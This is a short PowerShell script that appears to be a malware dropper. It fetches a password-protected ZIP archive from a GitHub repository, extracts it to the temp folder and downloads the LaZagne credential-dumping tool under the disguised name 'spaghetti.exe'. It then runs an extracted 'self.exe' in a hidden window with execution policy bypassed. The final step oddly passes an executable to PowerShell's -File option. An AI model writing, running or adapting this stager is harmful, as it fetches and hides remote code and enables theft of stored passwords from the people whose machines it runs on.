param (
    [string] $Password
)

# Download the archive from GitHub
$downloadUrl = "https://github.com/bakgatviooldoos/bascillaneous/raw/main/archive.zip"
$zipFilePath = "$env:TEMP\archive.zip"
Invoke-WebRequest -Uri $downloadUrl -OutFile $zipFilePath

# Unpack the password-protected ZIP archive
$extractedFolderPath = "$env:TEMP\HOME"
$arguments = "x", "`"$zipFilePath`"", "-o`"$extractedFolderPath`"", "-p$Password"
Start-Process -FilePath "C:\Program Files\7-Zip\7z.exe" -ArgumentList $arguments -Wait

Start-Sleep -Seconds 100

Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$extractedFolderPath\spaghetti.exe"

$executablePath = "$env:TEMP\HOME\self.exe"

# Execute the unpacked file
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$executablePath`"" -WindowStyle Hidden
